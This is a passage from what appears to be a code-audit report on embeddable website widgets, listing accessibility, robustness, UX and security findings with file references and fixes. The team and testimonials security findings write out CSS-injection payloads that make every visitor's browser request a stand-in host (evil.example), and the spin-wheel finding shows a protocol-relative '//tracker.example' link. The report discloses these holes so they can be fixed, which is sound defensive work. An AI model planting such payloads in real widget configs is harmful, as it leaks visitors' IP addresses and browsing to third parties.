- **⚪ Low · robustness** — Remote config fetch failure blanks the widget with no message or retry
  - `public/widget-emailsig.js:766-774`
  - **Breaks:** The config API is briefly down or the embedded widget id is stale. The host page shows an empty container where the signature tool should be; the customer assumes the widget is broken and cannot recover without a full page reload.
  - **Fix:** Render a minimal inline empty/error state into the container ('Signature tool unavailable, please refresh') instead of blanking it, matching the graceful-degradation pattern used elsewhere in the suite. Optionally attempt one silent retry before showing the message.
- **⚪ Low · accessibility** — Provider-guide tab switch destroys focus and does not announce the change
  - `public/widget-emailsig.js:639-645 (_onClick), 604-637 (_render), 612-634 (tab/steps markup)`
  - **Breaks:** A keyboard or screen-reader user tabs to 'Apple Mail', presses Enter, the panel re-renders, focus is lost to the top of the document, and nothing is announced, so they cannot tell the steps changed or resume navigation from the tab they activated.
  - **Fix:** Update only the steps <ol> content and the aria-selected attributes in place instead of rebuilding shadow.innerHTML; restore focus to the activated tab; give the steps region role='tabpanel' with aria-live='polite' and aria-controls wiring; add ArrowLeft/ArrowRight roving-tabindex navigation across the tabs.
- **⚪ Low · usability** — Editor live preview resets the selected install-guide tab on every keystroke
  - `public/editor-emailsig.html:424-433 (render/tearDown), 470 (bindInput), also 451/457/462/474-476/483`
  - **Breaks:** The editor user clicks 'Apple Mail' in the preview to read those install steps, then edits any field; the preview tears down and rebuilds, snapping back to the Gmail guide, making it awkward to review a non-Gmail guide while still editing.
  - **Fix:** Call the existing inst.update(C) method (widget-emailsig.js:734) to refresh config in place instead of tearDown()+new on every keystroke, so the selected provider survives; or capture inst.provider before tearDown and re-apply it after constructing the new instance.

### `hours`  — 4 findings (1 medium, 3 low)

> The Opening Hours widget is in good shape. It is CSP-clean (no inline handlers, no injected scripts, no eval), every author-supplied string is run through esc(), colours and font stacks are whitelisted (safeColor/safeFontStack), the phone number is stripped to digits before going into a tel: href, resolveApiBase() honours window.__TG_WIDGET_API__ then the script origin, it uses Shadow DOM with :host{all:initial}, has a double-init guard, and the fetch path handles non-2xx and JSON errors. The expandable compact panel is escapable three ways (toggle, outside-click, Escape) with no focus trap, timers and document listeners are cleared on destroy, and there is a self-cleanup path when the host is removed from the DOM. No security issues, dead ends, or circles-of-doom were found. The findings below are real but lower-impact: a correctness gap for overnight hours, a couple of minor UX/consistency and convention issues.

- **🟡 Medium · robustness** — Overnight / after-midnight opening hours never register as "open" and mislead the visitor
  - `public/widget-hours.js:260 (evalStatus); public/editor-hours.html:872-874 (time inputs, no end>start validation)`
  - **Breaks:** A late-opening travel lounge sets Friday 22:00-02:00. At 23:30 Friday, evalStatus sees b(120) < minutesNow(1410) so the slot is skipped as not-open. The todayLater lookahead (270-273) also finds nothing because the 22:00 open (1320) is not > 1410, so the engine falls through to the 7-day look-ahead and reports the pill as 'Closed' with 'Opens [next open day] at ...' while the business is actually open. (Note: the reviewer's exact wording 'Opens today at 22:00' is slightly off — it renders the next-day opening, not a today line — but the visitor is still wrongly told the business is closed.)
  - **Fix:** In evalStatus, detect b <= a as a midnight-spanning slot: treat it as open when `minutesNow >= a || minutesNow < b`, and carry the tail into the following day's evaluation for correct 'open until' and look-ahead. As a minimum, validate in the editor that the close time is after the open time (or explicitly flag an overnight slot) and surface an inline error so an impossible range cannot be saved silently.
- **⚪ Low · ux-ui** — "Open until {time}" is computed but hidden in card and list layouts
  - `public/widget-hours.js:929 (renderCard next-line), 939-953 (renderList — no label line at all), 1008 (renderCompactPanel)`
  - **Breaks:** A visitor on a card-layout embed sees only 'Open now' and cannot tell the office closes at 17:30 in ten minutes, whereas the identical config in compact-inline layout would show 'Open until 17:30'.
  - **Fix:** Render status.label in the card next-line block and the compact panel (and add a next-line to renderList) when status.open is true as well as when nextOpen is true, so the closing time is consistent across all four layouts.
- **⚪ Low · accessibility** — Keyboard focus on the compact pill is dropped every minute by the tick re-render
  - `public/widget-hours.js:1024 (_scheduleTick) → 743 (_render sets shadow.innerHTML)`
  - **Breaks:** A keyboard or screen-reader user tabs to the compact pill and opens it. Within 60 seconds the minute tick fires, innerHTML is rebuilt, and focus silently jumps to the top of the page mid-interaction.
  - **Fix:** Before re-rendering, record whether #compactTrigger held focus (and the panel-open state); after _render, restore focus to the recreated trigger. Alternatively skip the full re-render, or re-render only the status text, while the compact panel is open.
- **⚪ Low · usability** — Version header disagrees with the authoritative VERSION constant
  - `public/widget-hours.js:2 (header 'v1.0.0') vs :46 (VERSION = '1.0.4')`
  - **Breaks:** A maintainer debugging a customer report reads the file header, believes v1.0.0 is deployed, and chases a bug already fixed by 1.0.4.
  - **Fix:** Update the header comment to '1.0.4' to match VERSION and keep the two in sync on every bump.

### `quote-pdf`  — 4 findings (2 medium, 2 low)

> The visitor-facing widget (public/widget-quote-pdf.js) is clean and well-defended: Shadow DOM with :host{all:initial}, every innerHTML sink is fed through esc() or validated hex, logo/URL whitelisting, bounded page-scan BFS wrapped in try/catch, a double-init guard, and error/empty states that always recover (buttons re-enable, message auto-clears). No XSS sinks, no CSP violations, no dead ends and no unescapable states were found in the button. The remaining findings are secondary: two accessibility/contrast issues in the editor and two low-severity robustness/convention nits. No critical or high-severity problems. This is a well-built widget.

- **🟡 Medium · accessibility** — Editor colour-picker labels are not programmatically associated with their inputs
  - `public/editor-quote-pdf.html:172-177, 190-191`
  - **Breaks:** A screen-reader or voice-control user tabbing through Colours and Buttons hears each of the eight swatches announced only as an unnamed colour picker, with no way to know which one is top bar vs hero vs accent vs labels vs titles vs text vs button background vs button text, making the theming panel unusable non-visually.
  - **Fix:** Add `aria-label` to each `<input type="color">` (e.g. aria-label="Top bar colour"), or give each `<label>` a matching `for` pointing at the input id (labels already sit beside inputs with stable ids). Same fix applies to the two button-colour inputs.
- **🟡 Medium · ux-ui** — Hardcoded dark status-text colours become low-contrast in the editor's dark theme
  - `public/editor-quote-pdf.html:59-60`
  - **Breaks:** A user in dark mode opens the Settings tab; the 'Travelify connected' confirmation and the 'No Travelify credentials found' warning render as low-contrast dark text on a dark panel, hard to read, so they may not register whether the integration is connected.
  - **Fix:** Add `[data-tgse-theme="dark"] .qp-status.ok/.missing` overrides with lighter green/amber text (e.g. #34D399 / #FBBF24), or drive the text colour from tgse tokens so it inverts with the theme. Also the loading state already uses tokens correctly — match that pattern.
- **⚪ Low · robustness** — Stale auto-clear timer can wipe a fresh status message on repeated clicks
  - `public/widget-quote-pdf.js:507`
  - **Breaks:** Visitor clicks Download (message shown, clear scheduled for t+5s), operation completes, they click again ~4s later; the second op shows a fresh success/error message, then at t+5s the first timer fires and clears it after ~1s, so the second confirmation vanishes almost immediately.
  - **Fix:** Store the timeout id on the instance (e.g. this._msgTimer) and clearTimeout it at the start of `_run` and before scheduling the new one.
- **⚪ Low · robustness _(plausible)_** — API base is hardcoded to the vercel domain instead of derived from the script origin
  - `public/widget-quote-pdf.js:22-23, 513-516`
  - **Breaks:** If the widget script is later served from an origin whose /api is not the vercel host (a new alias without CORS to vercel, or after CORS tightening / host retirement), both the config fetch and the quote-pdf POST keep targeting the hardcoded vercel host and can fail, until the literal is edited — whereas an origin-derived base would follow the serving domain automatically.
  - **Fix:** After the `window.__TG_QUOTE_PDF_API__` override, derive the default base from the executing script's own origin (document.currentScript / script[src] pattern used elsewhere) so config and POST track the domain that served the widget.

### `spinwheel`  — 4 findings (1 medium, 3 low)

> The Spin the Wheel widget is well-built and mostly clean: Shadow DOM with :host{all:initial}, config sanitised through esc()/hexOk()/a font whitelist/safeUrl(), a proper double-init guard, transitionend plus a safety-net timeout so the spin always resolves, and reduced-motion respected. No XSS sink, no injected script/eval, no inline handlers, no unescapable modal, and no spinner that can hang. Five concrete issues remain. The two most material: (1) the weighted-pick loop uses a `||1` fallback that lets a segment configured with weight 0 win, and in fact collapses all weights toward equal whenever any zero weight is present, so the author's odds are silently wrong; (2) the result panel has no aria-live/role=status and, in one-spin-per-visitor mode, focus is dropped when the spin button is disabled, so keyboard and screen-reader visitors get no announcement of what they won. The remaining three are low severity (cosmetic restore position, protocol-relative URL acceptance in author config, and silent rejection of an invalid required hex in the editor).

- **🟡 Medium · accessibility** — Spin result is not announced to assistive tech and focus is lost when the button is disabled
  - `public/widget-spinwheel.js:485`
  - **Breaks:** A screen-reader visitor tabs to the spin button and presses Enter. The wheel animates and the result plus CTA appear visually, but nothing is announced. In one-spin mode the button is then disabled, focus falls to the body, and the visitor has no idea a result appeared or where the CTA is.
  - **Fix:** Add role="status" and aria-live="polite" to the .sw-result container so the injected title/text is announced. After reveal, move focus to the result heading (give #res-title tabindex="-1" and call focus()) or to the CTA link when present, rather than leaving focus on a button about to be disabled.
- **⚪ Low · ux-ui** — Restored one-spin lock shows the result but leaves the wheel pointing at the wrong segment
  - `public/widget-spinwheel.js:498`
  - **Breaks:** A visitor who won 'Rome' yesterday revisits. The card reads 'Your destination: Rome' but the wheel's pointer sits at rotation 0 (on a segment boundary, e.g. between Bali and the last prize), which looks broken and undercuts the stated prize.
  - **Fix:** In _restoreLock, find the won segment's index by matching the stored label against cfg.segments, compute the same targetMod used in _spin, set `this._rot` and the `.sw-rot` transform to align it under the pointer with the transition disabled so it snaps, then reveal.
- **⚪ Low · security** — safeUrl accepts protocol-relative (//host) URLs for logo and CTA
  - `public/widget-spinwheel.js:170`
  - **Breaks:** A saved or AI-emitted config with `ctaUrl: '//tracker.example'` passes safeUrl; the result CTA links to an unintended external origin and, being protocol-relative, is not covered by the https-only target=_blank branch at line 577.
  - **Fix:** After the scheme check, reject protocol-relative values, e.g. `if (/^\/\//.test(s)) return '';`, so only same-origin-relative (`/path`) and the explicit https/mailto/tel schemes are allowed.
- **⚪ Low · usability** — Editor silently ignores an invalid required hex, leaving field and preview out of sync
  - `public/editor-spinwheel.html:552`
  - **Breaks:** Editor user clears the accent hex and types 'teal'. The field shows 'teal', the preview colour does not change, no message appears, and on save the config still holds the previous accent — what the user sees typed and what gets saved diverge with no cue.
  - **Fix:** Add a blur handler (or an else branch on invalid input) that reverts the hex field to the current valid C[key] value, or show inline validation, so the visible field always matches the stored/previewed colour.

### `spotlight`  — 4 findings (2 medium, 2 low)

> The Spotlight widget is security-clean: every content value passes through esc(), URLs go through a safeUrl() protocol allowlist (javascript:/data: rejected), climate temperatures are coerced to finite numbers before innerHTML, paired-destination links are slug-validated and forced same-origin/https, and the editor escapes API-returned names. resolveApiBase() and the CONTENT_API resolver correctly honour the __TG_*__ override then script origin. No XSS sink, injected script, eval, or client-trusted plan gating was found. The findings are UX/robustness: a call-to-action that can strand a visitor as a dead control, loss of keyboard focus and open-accordion state when the climate unit toggle re-renders, a double-init race during the async config fetch, and small tap targets on the unit toggle. Four findings, none critical; the widget is in good shape.

- **🟡 Medium · dead-end** — CTA section renders a permanently disabled enquire button when no URL is configured (dead end)
  - `public/widget-spotlight.js:1834-1836 (_renderCta); defaults at :1260 sections.cta=true and :1284 cta.url=''`
  - **Breaks:** An agent saves a Spotlight widget, fills in the destination but never sets the CTA URL (leaving the '' default). The published customer-facing page shows a strong call to action, but the button is disabled. A visitor who wants to book sees the panel; the button is visibly greyed (opacity 0.8, not-allowed cursor) and clicking does nothing. There is no other path forward from that section.
  - **Fix:** On live render, omit the CTA section entirely when safeUrl(cta.url) is empty (return '' from _renderCta so html.filter(Boolean) drops it), or fall back to a configured default enquiry URL. If the disabled-preview affordance is wanted for the editor, introduce an explicit preview flag on the config and gate the disabled-button branch on it; the widget currently has no such flag.
- **🟡 Medium · accessibility** — Climate C/F toggle re-renders whole content, losing keyboard focus and any open planning accordion
  - `public/widget-spotlight.js:1899-1905 (unit toggle click handler) and :1421 (this.root.innerHTML = ... in _renderContent)`
  - **Breaks:** A keyboard or screen-reader user tabs to the °C/°F toggle and activates it; the whole content re-renders, the focused button no longer exists, and focus is lost to document start, forcing a full re-tab. Separately, a visitor who expanded 'Visa and entry' then flips the unit finds the accordion silently snapped shut.
  - **Fix:** After re-render, restore focus to the matching button, e.g. this.root.querySelector('.tgs-climate-unit[data-unit="'+unit+'"]').focus(). Better, update only the climate section's bar heights/labels/aria-pressed in place rather than rebuilding this.root, so both focus and open <details> state survive.
- **⚪ Low · robustness** — Double-init guard is set after the async config fetch, allowing a duplicate construction under MutationObserver
  - `public/widget-spotlight.js:1952-1990 (async init loop, await at :1971) and :1246 (data-tg-initialised set at end of constructor) and :2004-2028 (observer re-invokes init)`
  - **Breaks:** On a dynamic page builder like Duda (the exact case the observer targets, comment at :2004), the container is inserted and further DOM mutations fire the observer ~120ms later while the first config fetch is still in flight. The re-init picks up the still-unguarded element and issues a duplicate config fetch and a second new TGSpotlightWidget; the second attachShadow throws (swallowed by the try/catch), leaving a wasted request and a briefly inconsistent state.
  - **Fix:** Claim the element synchronously before awaiting: at the top of the loop iteration set el.setAttribute('data-tg-initialised','pending') (or add it to a module-level WeakSet), then upgrade to 'true' after successful construction and clear it on error so a failed init can be retried.
- **⚪ Low · accessibility** — Climate unit toggle buttons stay below the 44px minimum tap target on mobile
  - `public/widget-spotlight.js:645/650 (padding:6px 12px; min-height:28px) and :1136 (mobile override) vs CTA min-height:44px at :1062`
  - **Breaks:** On a phone a visitor tries to switch °C to °F; the ~28px-tall pill, sitting next to its sibling pill, is easy to mis-tap, causing accidental or missed taps.
  - **Fix:** Raise .tgs-climate-unit to min-height:44px (or add invisible padding to reach a 44px hit area) at touch/mobile widths in the :1136 media block, consistent with the CTA button sizing.

### `team`  — 4 findings (1 medium, 3 low)

> The Team Showcase widget is largely clean and well-hardened. All user content passes through esc() before innerHTML, URLs are scheme-allowlisted (javascript:/vbscript:/non-image data: blocked), image fallbacks use addEventListener not inline onerror (CSP-clean), there is a double-init guard, autoplay timers are cleared on update/destroy, and a failed remote config load correctly leaves the container empty rather than falling back to the built-in sample team. No dead ends or circles of doom were found in the visitor-facing widget: the empty state is informative, the department filter can never resolve to an empty result (chips are derived from members), and carousel arrows clamp at the boundaries rather than trapping. The findings below are genuine but lower-severity: an editor keyboard-accessibility gap, one colour-whitelisting convention deviation, and two minor a11y polish issues. No critical or high issues.

- **🟡 Medium · accessibility** — Member accordion cannot be expanded with the keyboard in the editor
  - `public/editor-team.html:832 (markup) and :1021-1034 (handler)`
  - **Breaks:** A keyboard-only editor user tabs through the member list. They reach the move/duplicate/delete buttons but cannot open a collapsed member: Tab never lands on the head div, and Enter/Space produce no toggle. They can only edit a member that auto-opened (freshly added/duplicated) and can never re-open one they collapsed, making editing existing members impossible without a mouse.
  - **Fix:** Make the toggle a real focusable control: either wrap the summary in a <button> with aria-expanded reflecting is-open, or add tabindex="0", role="button", aria-expanded, and a keydown listener on memberListEl that treats Enter/Space on a .member-head like the existing toggle click (guarding against target inside .member-actions/.member-body, mirroring line 1032).
- **⚪ Low · security** — Brand/accent colours are not whitelisted before injection into inline style, allowing CSS-declaration injection
  - `public/widget-team.js:846-848, 865`
  - **Breaks:** A malicious or compromised config (stored config or inline data-tg-config) sets brand to `#0891B2; background-image: url(https://evil.example/track)`. On render the injected declaration fires an outbound request from every visitor, leaking IP/User-Agent to an attacker host. No script executes (CSS is inert for JS), and the config author is normally the trusted site owner, hence low severity — but it is a real deviation from the colour-whitelisting requirement.
  - **Fix:** Validate brand/accent against a hex/rgb/named allowlist before use, e.g. `const col = /^#[0-9a-f]{3,8}$/i.test(v) ? v : DEFAULT;`, falling back to the default on failure, rather than relying on esc() alone.
- **⚪ Low · accessibility** — Carousel dots use role=tablist but the dots are not tabs
  - `public/widget-team.js:946 (container) and :938 (dot buttons)`
  - **Breaks:** A screen-reader user reaches the indicators, hears a tab list announced, but the children are read as ordinary buttons with no selected/position semantics, so the current slide (shown visually via the is-on dot) is not conveyed.
  - **Fix:** Either drop role="tablist" and expose the dots as a plain group of buttons with descriptive labels (e.g. 'Go to slide N of M'), or complete the pattern by adding role="tab" and aria-selected to each dot and toggling aria-selected in goTo alongside the is-on class.
- **⚪ Low · accessibility** — Carousel arrow/dot navigation animates with smooth scroll even under prefers-reduced-motion
  - `public/widget-team.js:1170-1173 (goTo) and CSS :608 (scroll-behavior: smooth)`
  - **Breaks:** A visitor with prefers-reduced-motion:reduce clicks the next arrow or a dot and gets an animated horizontal sliding transition — the exact motion they opted out of, which can trigger vestibular discomfort.
  - **Fix:** Reuse the existing reduceMotion pattern (matchMedia('(prefers-reduced-motion: reduce)')) in goTo and pass behavior: reduceMotion ? 'auto' : 'smooth', and add `@media (prefers-reduced-motion: reduce){ .tgt-carousel{ scroll-behavior: auto; } }` so the CSS default does not re-introduce the animation.

### `testimonials`  — 4 findings (3 medium, 1 low)

> The testimonials widget is largely well-engineered and genuinely XSS-hardened: all text goes through esc(), URLs through isSafeUrl(), colours through safeColor(), font-family through safeFontStack(), video URLs are re-parsed to a fixed embed allowlist, config is deeply merged/clamped, Shadow DOM is used, fetch has error handling, there is a double-init guard, timers are cleared on re-render and on host disconnect, and reduced-motion is respected. No visitor-facing circle of doom or unescapable modal exists (the empty state, filters and every layout always leave a way back). I found four real, code-anchored issues: one CSS-injection sanitisation gap in the avatar sink, two autoplay/auto-rotate defects (carousel autoplay stalls and self-destructs; featured auto-rotate wipes the DOM and steals keyboard focus), and one minor deviation from the documented API-base global. The editor is author-facing and uses the shared shell with escaped sinks; nothing critical there.

- **🟡 Medium · security** — Avatar URL is CSS-injected: esc() is the wrong sanitiser for a url() context
  - `public/widget-testimonials.js:958`
  - **Breaks:** An account with edit rights sets a testimonial avatar to https://x.com/a');background:url(https://evil.example/log?p=1 . isSafeUrl() returns true (protocol https) so it is stored verbatim at line 804. esc() yields ...a&#39;);background:url(https://evil.example/log?p=1 , and the rendered inline style HTML-decodes to background-image:url('https://x.com/a');background:url(https://evil.example/log?p=1');width:44px;height:44px . The browser issues a GET to evil.example on every page that embeds the widget (external resource load / view-tracking beacon) and honours the injected CSS declaration. Space is the one payload char percent-encoded by new URL(), so a working exploit simply avoids spaces, which the example does.
  - **Fix:** Do not rely on esc() for the CSS url() context. Build the node via the DOM and set el.style.backgroundImage = 'url("' + cssEscape(url) + '")', or reject any avatar URL containing ' " ( ) or whitespace before use, or percent-encode those characters. Alternatively render the avatar as an <img> (attribute context, already proven safe at line 993) instead of a CSS background.
- **🟡 Medium · dead-end** — Carousel autoplay stalls at the last card and permanently dies on hover
  - `public/widget-testimonials.js:1163`
  - **Breaks:** An author enables carousel.autoplay expecting a continuously rotating strip. On desktop the first mouse pass over the carousel (very likely within seconds) clears carouselTimer and it is never re-created, so autoplay is dead for the visit. Even with no hover, autoplay advances to the last card and then freezes there, the dots stuck on the last slide, the feature silently doing nothing for the rest of the visit.
  - **Fix:** Make autoplay loop: in the autoplay path detect when track.scrollLeft is at (or within one step of) track.scrollWidth - track.clientWidth and call track.scrollTo({left:0}) instead of scrollBy. Pair the mouseenter pause with a mouseleave (and optionally focusout) that re-arms the interval, guarding for reduced-motion and host disconnect so it does not resurrect a destroyed widget.
- **🟡 Medium · accessibility** — Featured auto-rotate rebuilds the whole widget every 6.5s, destroying keyboard focus
  - `public/widget-testimonials.js:1135`
  - **Breaks:** A keyboard user tabs onto a featured-layout slide dot; 6.5s later the timer fires, render() wipes and rebuilds the subtree, the focused button no longer exists and focus resets to document.body, losing the user's place. A screen-reader user reading the quote has it swapped mid-read with no announcement. The rotation cannot be paused by hovering or focusing.
  - **Fix:** Pause the featured auto-rotate on pointerenter/focusin and resume on pointerleave/focusout (mirroring the carousel pause), and update only the changing nodes or restore focus after render rather than replacing the whole container. Optionally wrap the slide in an aria-live="polite" region so changes are announced.
- **⚪ Low · robustness** — API-base override honours a non-documented global name
  - `public/widget-testimonials.js:52`
  - **Breaks:** An advanced customer proxying the API sets window.__TG_WIDGET_API__ per the platform docs. This widget ignores it and resolves the origin from its own script tag, so config requests go to the unproxied host. The override appears to do nothing until the customer discovers the undocumented TG_WIDGETS_API_BASE name.
  - **Fix:** Accept window.__TG_WIDGET_API__ as well (checked before or alongside TG_WIDGETS_API_BASE) so the widget matches the documented cross-suite override contract; keep TG_WIDGETS_API_BASE as a back-compat alias.

### `textfx`  — 4 findings (4 low)

> Text FX is a purely presentational kinetic-typography widget with 12 render modes. It is one of the cleaner widgets in the suite: all text is esc()'d, colours pass anchored safeColor() regexes that cannot inject CSS declarations, numbers are clamp()'d, fonts are safeFontStack()-validated, the single interpolated style attribute (rootStyle) is esc()'d, and mode-specific style="" strings only ever contain already-sanitised tokens. No XSS sink found, no inline event handlers, no injected <script>/eval/Function, correct Shadow DOM with :host{all:initial}, correct resolveApiBase() honouring __TG_WIDGET_API__ then script origin, guarded fetch (res.ok + try/catch + fail-silent), and a proper double-init guard. Because it renders text only (no nav, modals, links, or forms), there are no dead ends or circles of doom that can strand a visitor. The remaining findings are low-severity: an imperfect reduced-motion fallback for marquee, a couple of untracked timers/rAFs, a never-in-view counter that shows its start value, and a fully-blank widget when an author clears all typewriter phrases.

- **⚪ Low · accessibility** — Marquee reduced-motion fallback shows duplicated, clipped content
  - `public/widget-textfx.js:444, 957-1015`
  - **Breaks:** A visitor with prefers-reduced-motion enabled loads a page using marquee mode with respectReducedMotion on. Instead of a clean single static list they see the item list rendered twice in a row, the second copy clipped mid-word by the container width and softened by the edge-fade mask. It reads as a rendering glitch rather than a deliberate static state.
  - **Fix:** Add a `if (this._prefersReduced())` branch near line 960 in _renderMarquee that renders a single, non-duplicated item list with no animation, mirroring the other modes; or in the @media(prefers-reduced-motion) CSS hide the aria-hidden second copy (e.g. mark it with a class and display:none) and drop the mask.
- **⚪ Low · robustness** — Untracked setTimeout/requestAnimationFrame in rotating and marquee are not cancelled on destroy
  - `public/widget-textfx.js:786, 797, 1006`
  - **Breaks:** An SPA host removes the widget element (or calls destroy()) in the ~600ms window after a rotating word swap; the orphaned setTimeout at 786 still fires. It is harmless in practice (parentNode/track null-checks short-circuit the bodies), so the only effect is a few no-op callbacks rather than a leak or crash. Worth tidying for correctness parity with the rest of the class.
  - **Fix:** Route the 786 setTimeout through this._setTimer, and store the 797/1006 rAF handles in a tracked field (e.g. push to a this._rafs array) so _teardown() cancels them, matching how the counter/typewriter timers are already managed.
- **⚪ Low · usability** — Counter with startOnView never animates if the element is never scrolled into view
  - `public/widget-textfx.js:857-869`
  - **Breaks:** An author places the counter inside a tab the visitor never opens, or a display:none section. The counter is stuck showing the formatted 'from' value (e.g. '0') indefinitely and never counts up to 'to'. The intended count-up effect never plays.
  - **Fix:** Acceptable as designed, but consider a fallback timer that animates anyway after N seconds if never intersected, or document that startOnView requires the element to eventually enter the viewport.
- **⚪ Low · ux-ui** — Typewriter (and other single-text modes) with all content removed renders a blank widget
  - `public/widget-textfx.js:686-692`
  - **Breaks:** An author clears all typewriter phrases (or ships phrases:[]). The embedded widget renders an empty padded box (root padding at line 116) on the customer's live site with no text and no cursor, giving the visitor nothing and the author no on-page hint that content is missing.
  - **Fix:** Render a neutral placeholder or fall through to _renderFallback's 'Text FX' when a mode has no usable content, so an empty config never produces a silent blank box on a live page.

### `whatsapp`  — 4 findings (3 medium, 1 low)

> The WhatsApp widget is clean on security and CSP (all dynamic values pass through esc(), colours/fonts/image URLs whitelisted, both API bases resolve to the script origin not a relative path, double-init guard present, timers cleared on update/destroy, reduced-motion honoured). No XSS sinks or CSP violations found. The genuine defects are all in the out-of-hours (office-hours) experience, where the CTA is disabled in a way that strands the visitor and contradicts the widget's own copy, plus a page-reload dead end when the widget is misconfigured with no phone number.

- **🟡 Medium · dead-end** — Out-of-hours inline and card CTAs look fully enabled but are inert — click does nothing
  - `public/widget-whatsapp.js:1322 (inline anchor), 1345 (card anchor); CSS 751 only styles .tgwa-cta[data-disabled]`
  - **Breaks:** Author enables office hours and picks the inline or card layout. A visitor arrives out-of-hours, sees a bright green pill (inline still labelled 'Chat on WhatsApp'), clicks it and nothing happens — no navigation, no feedback. The card at least relabels its button 'Closed'; the inline pill's only cue is a small sub-label.
  - **Fix:** Either add [data-disabled='true'] styling for .tgwa-inline and .tgwa-inline-card-cta (muted background, cursor:not-allowed, reduced opacity) mirroring .tgwa-cta, or preferably keep the wa.me link live out-of-hours (see the away-message finding) so there is no inert affordance at all.
- **🟡 Medium · dead-end** — Out-of-hours away message invites 'leave a message' but the single-mode CTA is disabled; multi-agent rows stay live (inconsistent)
  - `public/widget-whatsapp.js:1300-1304 (panel foot), 1276/86 (offline copy), 1282 (multi rows)`
  - **Breaks:** Author enables office hours (a headline feature) in single mode with the default away copy. A visitor arrives after hours, reads 'Leave a message and we'll get back to you', and finds the only button greyed out and unclickable. A lead is lost. Switch the same widget to multi-agent mode and the equivalent links work fine out-of-hours.
  - **Fix:** Do not disable the WhatsApp CTA out-of-hours — keep the wa.me link live (optionally prefixing the message to note it's after hours) so the visitor can leave a message as the copy promises, and make single/inline/card consistent with the multi-agent rows. If a disabled state is genuinely wanted, change the away copy so it no longer says to leave a message.
- **🟡 Medium · circle-of-doom** — Widget with no phone configured renders a CTA whose empty href opens a duplicate tab of the current page (not a reload)
  - `public/widget-whatsapp.js:256-261 (buildWaLink), 1299-1304 / 1315-1322 / 1336-1345`
  - **Breaks:** Author saves a WhatsApp widget but leaves the phone blank (or the remote config returns a record with no phone). The widget still renders a green 'Start chat'/'Chat on WhatsApp' button. A visitor clicks it and a new browser tab opens on the very same page — no chat, just a confusing duplicate tab each click.
  - **Fix:** When _waLink(phone) is empty, treat the CTA as disabled (data-disabled='true' with disabled styling) or omit the button entirely and show a neutral state, so an empty href can never navigate or open a duplicate tab.
- **⚪ Low · accessibility** — Chat panel is role='dialog' but never receives focus and cannot be closed with Escape
  - `public/widget-whatsapp.js:1207 (floating), 1233 (vertical), _bind 1353-1444`
  - **Breaks:** A keyboard-only visitor presses Enter on the chat button. The dialog visually opens but focus stays on the FAB, so a screen reader announces nothing and Escape does nothing. The user must blind-tab forward to find the close control.
  - **Fix:** On open, move focus to the panel or its close button, and add a keydown listener for Escape that calls this.close(); add aria-modal='true'. Remove the listener in destroy() to avoid leaks.

### `youtube`  — 4 findings (1 medium, 3 low)

> The YouTube widget is well built and largely clean. Security is solid: every dynamic string goes through esc(), URLs through safeUrl() (http/https only, so no javascript:/data: injection), colours/fonts/numbers are whitelisted and clamped, video and channel IDs are regex-validated, the embed uses youtube-nocookie, resolveBase() honours the override then script origin (no relative /api), storage isn't used, and the double-init guard (el.__tgInited) is present. The lightbox is fully escapable (Esc, backdrop click, close button) with focus save/restore — no circle of doom for a mouse user, and no dead-end states (empty/error both render a message). Findings are one editor-side efficiency/UX issue (re-fetch on every keystroke), one real accessibility gap in the modal focus trap, and two low-severity robustness/copy nits. No security or hard-trap defects found.

- **🟡 Medium · robustness** — Editor re-instantiates the widget and re-fetches the YouTube feed on every keystroke and slider tick
  - `public/editor-youtube.html:406-413 (render), plus 511-513, 517-518, 522, 528`
  - **Breaks:** The editor user types a 20-character header subtitle into #head-sub. wireText's 'input' handler fires ~20 render() calls, each replacing #widget-mount with a clone, constructing a new widget that flashes the grey .tgy-sk skeleton, and calling fetch on /api/youtube-feed. The visible result is a preview that flickers to skeletons on every keystroke; the browser fires dozens of near-identical feed requests during a single edit (blunted but not eliminated by CDN caching).
  - **Fix:** Debounce render() (150-250ms) for text and slider inputs, and/or route presentation-only changes (title, subtitle, CTA label, colours, radius, columns, layout) through widgetInst.update(C) instead of a full destroy+re-instantiate — but note update() itself still calls _load() and re-fetches, so ideally add a code path that only re-fetches when channelId/maxVideos actually change and otherwise re-renders from the already-loaded this.videos.
- **⚪ Low · accessibility** — Modal focus trap cannot hold focus once it enters the cross-origin video iframe
  - `public/widget-youtube.js:312-325 (_onKey), 522 (iframe)`
  - **Breaks:** A keyboard or screen-reader user opens the lightbox, Tabs from the close button into the YouTube player, keeps tabbing through the player's controls, and focus exits the bottom of the iframe onto interactive elements on the host page behind the overlay while the dialog is still visually open and marked aria-modal='true'.
  - **Fix:** Since the cross-origin boundary makes a perfect trap impossible, mitigate instead: while the dialog is open, set inert (or aria-hidden='true' plus tabindex management) on the .tgy-root children other than the lightbox so host/page content behind the overlay is unreachable, and/or add focusable sentinel elements immediately before and after the .tgy-lb-inner so forward/backward tab-out of the iframe is caught the instant focus returns to the parent document.
- **⚪ Low · ux-ui** — A valid channel with zero uploads shows the error message, not the neutral empty message
  - `public/widget-youtube.js:405-407`
  - **Breaks:** An editor connects a brand-new or empty channel whose feed proxy returns {ok:true, videos:[]} with no error field. The visitor sees 'Couldn't load videos right now', implying a technical fault, when the accurate state is simply that the channel has published no videos.
  - **Fix:** Split the empty case out: when r.ok && d && d.ok but d.videos is empty, call this._renderEmpty(this.t('noVideos')); reserve errorHelp for actual !r.ok, missing/invalid d, d.ok===false, or JSON parse failure.
- **⚪ Low · robustness** — Public update() path leaks the carousel ResizeObserver
  - `public/widget-youtube.js:555-561 (update), 506 (_ro assignment)`
  - **Breaks:** A host page calls widgetInst.update(newCfg) repeatedly on a carousel widget (e.g. reacting to theme, locale, or filter changes). Each call leaves the prior ResizeObserver bound to an orphaned/detached track element, accumulating observers and memory over the page's lifetime.
  - **Fix:** At the top of update() (or before assigning this._ro in _wireCarousel) disconnect any existing observer: `if (this._ro) { try { this._ro.disconnect(); } catch (e) {} this._ro = null; }`, mirroring what destroy() already does.

### `backtotop`  — 3 findings (2 medium, 1 low)

